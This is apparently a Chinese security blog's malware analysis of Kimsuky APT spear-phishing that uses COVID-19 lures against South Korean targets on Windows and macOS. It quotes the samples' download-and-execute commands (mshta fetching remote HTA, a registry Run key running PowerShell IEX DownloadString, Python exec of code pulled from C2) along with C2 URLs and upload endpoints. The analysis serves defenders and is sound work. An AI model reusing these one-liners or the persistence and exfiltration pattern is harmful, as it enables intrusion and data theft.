> 原文链接: https://www.anquanke.com//post/id/201504 


# Kimsuky APT组织利用疫情话题针对南韩进行双平台的攻击活动的分析


                                阅读量   
                                **580393**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t011659c8273ee85159.png)](https://p3.ssl.qhimg.com/t011659c8273ee85159.png)



## 一.前言

`kimsuky` APT组织(又名**Mystery Baby, Baby Coin, Smoke Screen, BabyShark, Cobra Venom**) ,该组织一直针对于韩国的智囊团,政府组织,新闻组织,大学教授等等进行活动.并且该组织拥有`windows`平台的攻击能力,载荷便捷,阶段繁多。并且该组织十分活跃.其载荷有**带有漏洞的hwp文件,恶意宏文件,释放载荷的PE文件**等

近日,随着海外病例的增加,使用新型冠状病毒为题材的攻击活动愈来愈多.例如:**海莲花APT组织通过白加黑的手段向中国的政府部门进行鱼叉投递,摩诃草APT组织冒充我国的重点部门针对政府和医疗部门的攻击活动,毒云藤和蓝宝菇组织通过钓鱼的方式窃取人员的邮箱密码,借以达到窃密或者是为下一阶段做准备的目的以及蔓灵花组织继续采用SFX文档的方式对我国重点设施进行投放.**

同时,在朝鲜半岛的争夺也随之展开.`Gcow`安全团队**追影小组**在日常的文件监控之中发现名为`kimsuky`APT组织采用邮件鱼叉的方式针对韩国的新闻部门,政府部门等进行攻击活动,并且在此次活动之中体现出该组织在攻击过程中使用**轻量化,多阶段脚本载荷**的特点.并且在本次活动中我们看到了该组织使用`python`针对`MacOS`平台进行无文件的攻击活动.

下面笔者将从攻击`Windows`平台的样本以及攻击`MacOs`平台的样本进行分析



## 二.Windwos平台样本分析:

### <a class="reference-link" name="1.%EC%BD%94%EB%A1%9C%EB%82%98%EB%B0%94%EC%9D%B4%EB%9F%AC%EC%8A%A4%20%EB%8C%80%EC%9D%91.doc(%E5%86%A0%E7%8A%B6%E7%97%85%E6%AF%92%E5%8F%8D%E5%BA%94.doc)"></a>1.코로나바이러스 대응.doc(冠状病毒反应.doc)

#### <a class="reference-link" name="0x00.%E6%A0%B7%E6%9C%AC%E4%BF%A1%E6%81%AF:"></a>0x00.样本信息:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013e0bdaf25fb889a8.png)

该样本利用**社会工程学**的办法，诱使目标点击“**启用内容**”来执行宏的恶意代码。启用宏后显示的正文内容。通过谷歌翻译，提取到几个关键词：**新型冠状病毒**<br>
可以看出，这可能是针对**韩国政府**发起的一次攻击活动。

[![](https://p4.ssl.qhimg.com/dm/1024_576_/t011fd9795c06411778.png)](https://p4.ssl.qhimg.com/dm/1024_576_/t011fd9795c06411778.png)

攻击者通过**鱼叉邮件附件**的方式将恶意载荷投递给受害目标

[![](https://p1.ssl.qhimg.com/t01fd082b8669fe89ef.png)](https://p1.ssl.qhimg.com/t01fd082b8669fe89ef.png)

#### <a class="reference-link" name="0x01.%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"></a>0x01. 样本分析

利用`olevba`工具提取的宏代码如下:<br>
其将执行的命令通过`hex编码`的形式在宏里面自己解码后隐藏执行<br>
所执行的命令为:

`mshta http://vnext.mireene.com/theme/basic/skin/member/basic/upload/search.hta /f`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_407_/t015c2d4702792d341c.png)

##### <a class="reference-link" name="search.hta"></a>search.hta

其主要内嵌的是`vbs`代码,请求`URL`以获取下一段的`vbs`代码,并且执行获取到的`vbs`代码

URL地址为:`http://vnext.mireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=1`

[![](https://p4.ssl.qhimg.com/t018e92dc19fedb21f0.png)](https://p4.ssl.qhimg.com/t018e92dc19fedb21f0.png)

##### <a class="reference-link" name="1.vbs"></a>1.vbs

下一段的`vbs`代码就是其**侦查者**的主体代码:

**1.信息收集部分:**

收集**本机名以及本机所在域的名称,ip地址,用户名称, %programfiles%下的文件, %programfiles% (x86)下的文件,安装软件信息,开始栏的项目,最近打开的项目,进程列表,系统版本信息,set设置信息,远程桌面连接信息, ,arp信息, %appdata%Microsoft下所有文件以及子文件信息,文档文件夹信息,下载文件信息,powershell文件夹下的文件信息，盘符信息,宏的安全性信息,outlook信息**等等

[![](https://p1.ssl.qhimg.com/dm/1024_328_/t01df0bdbe8daf66de1.png)](https://p1.ssl.qhimg.com/dm/1024_328_/t01df0bdbe8daf66de1.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_244_/t01f5af4907abf73b50.png)

**2.添加计划任务以布置下一阶段的载荷:**

伪装成`Acrobat`更新的任务

执行命令: `mshta http://vnext.mireene.com/theme/basic/skin/member/basic/upload/cfhkjkk.hta`

获取当前时间,延迟后执行`schtasks`创造该计划任务

[![](https://p1.ssl.qhimg.com/t019dcea9b2e9cde358.png)](https://p1.ssl.qhimg.com/t019dcea9b2e9cde358.png)

##### <a class="reference-link" name="cfhkjkk.hta"></a>cfhkjkk.hta

和`search.hta`一样,也是一样的中转的代码,URL为:`http://vnext.mireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=2`

[![](https://p2.ssl.qhimg.com/t01ee6a1abe1a005a7f.png)](https://p2.ssl.qhimg.com/t01ee6a1abe1a005a7f.png)

##### <a class="reference-link" name="2.vbs"></a>2.vbs

其同样也是`vbs`文件.其主要的功能是查看**%Appdata%Windowsdesktop.ini**是否存在,如果存在则利用**certutil -f -encode**对文件进行编码并且输出为**%Appdata%Windowsres.ini**,并且从URL地址下载`http://vnext.mireene.com/theme/basic/skin/member/basic/upload/download.php?param=res1.txt`编码后的`powershell`命令隐藏执行,执行成功后删除**Appdata%Windowsdesktop.ini**.并且从URL地址下载`http://vnext.mireene.com/theme/basic/skin/member/basic/upload/download.php?param=res2.txt`编码后的`powershell`命令隐藏执行.

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_516_/t01332fe743be4d1907.png)

##### <a class="reference-link" name="res1.txt"></a>res1.txt

该`powershell`命令主要功能就是读取**Appdata%Windowsres.ini**文件里的内容,再组成`HTTP`报文后利用`UploadString`上传到`C2`,`C2`地址为:`http://vnext.mireene.com/theme/basic/skin/member/basic/upload/wiujkjkjk.php`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014f088b284f0f171c.png)

##### <a class="reference-link" name="res2.txt"></a>res2.txt

该`powershell`命令主要功能是通过对比按键`ASCII`码值记录信息

我们可以看到被黑的站点是一个购物平台,攻击者应该入侵这个购物平台后把相应的恶意载荷挂到该网站.

[![](https://p3.ssl.qhimg.com/dm/1024_511_/t019f757242e3a3b0a9.png)](https://p3.ssl.qhimg.com/dm/1024_511_/t019f757242e3a3b0a9.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_414_/t011a4c3b110f5ee3f8.png)

此外我们通过比较相同的宏代码发现了其一个类似的样本

### <a class="reference-link" name="2.%EB%B9%84%EA%B1%B4%20%EB%AF%B8%EA%B5%AD%EB%AC%B4%EB%B6%80%20%EB%B6%80%EC%9E%A5%EA%B4%80%20%EC%84%9C%EC%8B%A0%2020200302.doc(%E7%BE%8E%E5%9B%BD%E5%9B%BD%E5%8A%A1%E5%8D%BF%E7%B4%A0%E9%A3%9F%E4%B8%BB%E4%B9%89%E8%80%8520200302.doc)"></a>2.비건 미국무부 부장관 서신 20200302.doc(美国国务卿素食主义者20200302.doc)

#### <a class="reference-link" name="0x00.%E6%A0%B7%E6%9C%AC%E4%BF%A1%E6%81%AF"></a>0x00.样本信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019bd9bcd6c570cefd.png)

该样本利用**社会工程学**的办法，诱使目标点击“**启用内容**”来执行宏的恶意代码。启用宏后显示的正文内容。通过谷歌翻译，提取到几个关键词：**朝韩问题,政策,朝鲜半岛**。<br>
可以看出，这可能是针对**韩国政府机构**发起的一次攻击活动。

[![](https://p2.ssl.qhimg.com/dm/1024_544_/t01d2688c483030cabc.png)](https://p2.ssl.qhimg.com/dm/1024_544_/t01d2688c483030cabc.png)

#### <a class="reference-link" name="0x01%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"></a>0x01 样本分析

其与上文所述相同不过,本样本执行的命令是:

`mshta http://nhpurumy.mireene.com/theme/basic/skin//member/basic/upload/search.hta /f`

[![](https://p1.ssl.qhimg.com/dm/1024_422_/t016d9f61e9cff08a61.png)](https://p1.ssl.qhimg.com/dm/1024_422_/t016d9f61e9cff08a61.png)

相同的中转`search.hta`

中转地址为:`http://nhpurumy.mireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=1`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ce920216bcd7dabe.png)

其执行的vbs代码与上文类似,在这里就不做赘述了.不过其计划任务所执行的第二部分`hta`的`url`地址为:<br>`http://nhpurumy.mireene.com/theme/basic/skin/member/basic/upload/cfhkjkk.hta`

[![](https://p1.ssl.qhimg.com/dm/1024_180_/t01987146c142f6c165.png)](https://p1.ssl.qhimg.com/dm/1024_180_/t01987146c142f6c165.png)

之后的部分代码与上文相同,不过其`C2`的地址为`nhpurumy.mireene.com`。在此就不赘述了。

被入侵的网站可能是一个广告公司:

[![](https://p4.ssl.qhimg.com/dm/1024_516_/t01a41c94a1fd77c445.png)](https://p4.ssl.qhimg.com/dm/1024_516_/t01a41c94a1fd77c445.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_413_/t0181c61e0905013918.png)

### <a class="reference-link" name="3.%EB%B6%99%EC%9E%84.%20%EC%A0%84%EB%AC%B8%EA%B0%80%20%EC%B9%BC%EB%9F%BC%20%EC%9B%90%EA%B3%A0%20%EC%9E%91%EC%84%B1%20%EC%96%91%EC%8B%9D.doc%EF%BC%88%E9%99%84%E4%B8%8A.%E4%B8%93%E5%AE%B6%E4%B8%93%E6%A0%8F%E6%89%8B%E7%A8%BF%E8%A1%A8%E6%A0%BC.doc%EF%BC%89"></a>3.붙임. 전문가 칼럼 원고 작성 양식.doc（附上.专家专栏手稿表格.doc）

#### <a class="reference-link" name="0x01%E6%96%87%E6%A1%A3%E4%BF%A1%E6%81%AF:"></a>0x01文档信息:

##### <a class="reference-link" name="%E6%A0%B7%E6%9C%AC%E4%BF%A1%E6%81%AF:"></a>样本信息:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011c74302313987dc4.png)

该样本利用**社会工程学**的办法，诱使目标点击“**启用内容**”来执行宏的恶意代码。启用宏后显示的正文内容。通过谷歌翻译，提取到几个关键词：**稿件、专家专栏**。<br>
可以看出，这可能是针对**韩国新闻机构**发起的一次攻击活动。

[![](https://p1.ssl.qhimg.com/dm/1024_536_/t016f252cd30c2a4490.png)](https://p1.ssl.qhimg.com/dm/1024_536_/t016f252cd30c2a4490.png)

#### <a class="reference-link" name="0x02%20%E6%81%B6%E6%84%8F%E5%AE%8F%E5%88%86%E6%9E%90"></a>0x02 恶意宏分析

利用`olevba`工具提取的宏代码如下:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_670_/t01ba4e96fe7558e25d.png)

**显示文档的内容:**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016a2b315692adc8b9.png)

隐藏执行`powershell.exe`代码读取`%TEMP%bobo.txt`的内容,并且使用`iex`执行

[![](https://p4.ssl.qhimg.com/dm/1024_118_/t013846db78fc3f2a12.png)](https://p4.ssl.qhimg.com/dm/1024_118_/t013846db78fc3f2a12.png)

`Bobo.txt`内容

[![](https://p0.ssl.qhimg.com/t0120f27d1b31c5ba6c.png)](https://p0.ssl.qhimg.com/t0120f27d1b31c5ba6c.png)

从`http://mybobo.mygamesonline.org/flower01/flower01.ps1`上下载第二段`powershell`载荷`flower01.ps1`并且利用`iex`内存执行

第二段`powershell`载荷如图所示:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_517_/t012737ee8f1ca65d74.png)

#### <a class="reference-link" name="0x03%20%E6%81%B6%E6%84%8Fpowershell%E5%88%86%E6%9E%90"></a>0x03 恶意powershell分析

Powershell后门配置信息:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_217_/t01b4538f7ce9d8faa2.png)

写入注册表启动项,键名: `Alzipupdate`,键值:

```
cmd.exe /c powershell.exe -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://mybobo.mygamesonline.org/flower01/flower01.ps1')
```

开机启动就远程执行本ps1文件

[![](https://p5.ssl.qhimg.com/dm/1024_141_/t01fd98c67b7a7dcb3d.png)](https://p5.ssl.qhimg.com/dm/1024_141_/t01fd98c67b7a7dcb3d.png)

收集信息:**最近使用的项目(文件),%ProgramFiles%以及C:Program Files (x86)下的文件,系统信息,当前进程信息**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017728e83fdb3bd79e.png)

将这些结果写入`%Appdata%flower01flower01.hwp`中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011db3e5fa662a99ac.png)

`Flower01.hwp`内容:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/310_1024_/t0139e429763804c08f.png)

将收集到的信息循环上传到`C2`并且接收回显执行

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ed630faf60a0f0f2.png)

**上传函数:**

将数据上传到`http://mybobo.mygamesonline.org/flower01/post.php`

[![](https://p1.ssl.qhimg.com/t013b187c7c5d87100a.png)](https://p1.ssl.qhimg.com/t013b187c7c5d87100a.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_465_/t01cd50cc8765189c41.png)

**下载函数:**

请求URL地址:`http://mybobo.mygamesonline.org/flower01/flower01.down`获得<br>
第二阶段被加密的载荷,解密后通过添加代码块以及新建工作的方式指行第二段载荷

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013057c4dbceacd35b.png)

执行完毕后向`C2`地址请<br>
求:”`http://mybobo.mygamesonline.org/flower01/del.php?filename=flower01`“标志载荷已经**执行成功**

[![](https://p1.ssl.qhimg.com/t012615dd7fb97b355b.png)](https://p1.ssl.qhimg.com/t012615dd7fb97b355b.png)

为了方便各位看官理解,刻意绘制了两张流程图描述该后门的情况

图一如下: 是第三个样本的流程图 全过程**存在一个恶意文件落地**.

[![](https://p4.ssl.qhimg.com/t010ecaf2bfe8815940.png)](https://p4.ssl.qhimg.com/t010ecaf2bfe8815940.png)

图二如下: 是前两个样本的流程图 全过程**无任何恶意文件落地**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016b3844a42e47b4fd.png)



## 三.MacOS平台的样本分析:

### <a class="reference-link" name="1.COVID-19%20and%20North%20Korea.docx(COVID-19%E4%B8%8E%E6%9C%9D%E9%B2%9C.docx)"></a>1.COVID-19 and North Korea.docx(COVID-19与朝鲜.docx)

#### <a class="reference-link" name="0x00.%20%E6%A0%B7%E6%9C%AC%E4%BF%A1%E6%81%AF"></a>0x00. 样本信息

[![](https://p0.ssl.qhimg.com/t01968fe1e37740994d.png)](https://p0.ssl.qhimg.com/t01968fe1e37740994d.png)

#### <a class="reference-link" name="0x01%20%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90"></a>0x01 样本分析

该样本是docx文件,攻击者运用**社会工程学**的手法,设置了一张在`MAC`系统启动宏文档的图片,来诱导受害者点击启动宏,**当受害者启动宏后该样本就会移除图片显示出文档的内容**

[![](https://p4.ssl.qhimg.com/dm/1024_558_/t012ac6c8505fd3b5e1.png)](https://p4.ssl.qhimg.com/dm/1024_558_/t012ac6c8505fd3b5e1.png)

由此可见,我们可以看到该样本与**新型冠状病毒**的话题有关,可能针对的是**韩国的政府机构**

该样本利用**远程模板注入技术**对远程模板进行加载

远程模板URL:”`http://crphone.mireene.com/plugin/editor/Templates/normal.php?name=web`“

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_490_/t01487ffaaafd3f7654.png)

宏代码会将之前遮盖的部分显示,用以迷惑受害者,相关代码:

[![](https://p3.ssl.qhimg.com/t0152313dedabf5f350.png)](https://p3.ssl.qhimg.com/t0152313dedabf5f350.png)

该样本会判断是否是`MAC`系统,若是`MAC`系统就会执行`python`命令下载第一阶段的`python`代码

命令为:

```
python -c exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v1')).read())
```

[![](https://p5.ssl.qhimg.com/dm/1024_143_/t01dde983ec142d8a50.png)](https://p5.ssl.qhimg.com/dm/1024_143_/t01dde983ec142d8a50.png)

第一阶段的`python`代码主要起到一个中转的作用

其会执行如下代码去加载第二阶段的`python`代码:

```
urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60')).read()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_237_/t01d5082591b92b9f7e.png)

第二段`python`代码类似于一个侦察者:

##### <a class="reference-link" name="a.%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"></a>a.收集信息

其会收集**系统位数信息,系统信息,所安装的APP列表, 文件列表, 下载文件列表, 盘符信息**等,并且将这些数据写入对应的`txt`文件中于恶意样本所创造的工作目录下

[![](https://p1.ssl.qhimg.com/t01aaa01a28e61b98f4.png)](https://p1.ssl.qhimg.com/t01aaa01a28e61b98f4.png)

##### <a class="reference-link" name="b.%E6%89%93%E5%8C%85%E6%89%80%E6%94%B6%E9%9B%86%E7%9A%84%E4%BF%A1%E6%81%AF"></a>b.打包所收集的信息

首先先删除`backup.rar`文件,再将工作目录下的所有txt文件利用**zip -m -z**命令进行打包,输出为`backup.rar`文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d821b17f1cf121dc.png)

##### <a class="reference-link" name="c.%E5%B0%86%E6%94%B6%E9%9B%86%E7%9A%84%E4%BF%A1%E6%81%AF%E5%9B%9E%E4%BC%A0%E5%88%B0C2"></a>c.将收集的信息回传到C2

通过创建`Http`链接,将`rar`的数据组成**报文**,发送到`C2`: `http://crphone.mireene.com/plugin/editor/Templates/upload.php`

[![](https://p2.ssl.qhimg.com/dm/1024_340_/t01de5efdc60976467f.png)](https://p2.ssl.qhimg.com/dm/1024_340_/t01de5efdc60976467f.png)

##### <a class="reference-link" name="d.%E5%90%91C2%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96%E6%96%B0%E7%9A%84python%E4%BB%A3%E7%A0%81"></a>d.向C2请求获取新的python代码

更新代码:

```
urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=new')).read()
```

从`http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=new`获取新的`Python`载荷

[![](https://p0.ssl.qhimg.com/dm/1024_61_/t010af7b8f1740709db.png)](https://p0.ssl.qhimg.com/dm/1024_61_/t010af7b8f1740709db.png)

其创造一个线程,**循环执行收集机器信息并且上传,不断向C2请求执行新的python代码**,中间休息`300`秒,这也解释了为什么在打包信息的时候需要先删除`backup.rar`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019cc1be4762e690b0.png)

从本次C2的域名: `crphone.mireene.com`来看,应该是一个卖智能手机的网站

[![](https://p0.ssl.qhimg.com/dm/1024_510_/t01574c9fe8e65b5a51.png)](https://p0.ssl.qhimg.com/dm/1024_510_/t01574c9fe8e65b5a51.png)

[![](https://p1.ssl.qhimg.com/dm/1024_376_/t0187b47a614c9fb49e.png)](https://p1.ssl.qhimg.com/dm/1024_376_/t0187b47a614c9fb49e.png)

为了方便各位看官理解,笔者绘制了一张流程图:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_724_/t016ba451672e33bbdb.png)



## 四.关联与总结:

### <a class="reference-link" name="1.%E5%85%B3%E8%81%94"></a>1.关联

#### <a class="reference-link" name="(1).%E7%BB%84%E6%88%90%E4%B8%8A%E7%BA%BF%E6%8A%A5%E6%96%87%E7%9A%84%E7%89%B9%E5%BE%81"></a>(1).组成上线报文的特征

在`kimsuky` APT组织之前的样本中所组成的上线报文中含有类似于`7e222d1d50232`以及`WebKitFormBoundarywhpFxMBe19cSjFnG`的特征上线字符

**WebKitFormBoundarywhpFxMBe19cSjFnG:**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_546_/t01d9b29b202aab5660.png)

**7e222d1d50232:**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_460_/t01d6db1dafe1e9890b.png)

#### <a class="reference-link" name="(2).%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BB%A3%E7%A0%81%E7%9B%B8%E4%BC%BC%E6%80%A7"></a>(2).信息收集代码相似性

在`kimsuky` APT组织之前的样本中,我们发现了该组织在进行`windows`平台下的信息收集代码存在很大的相似性.比如**收集信息所使用的命令**,包含了上文所提到的各类信息收集的内容.虽然在较新的时候做了简化.但是依旧可以反映出二者的同源性

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_576_/t01e1ba9cc84e260a00.png)

### <a class="reference-link" name="2.%E6%80%BB%E7%BB%93"></a>2.总结

**kimsukyAPT组织是值得关注的威胁者**

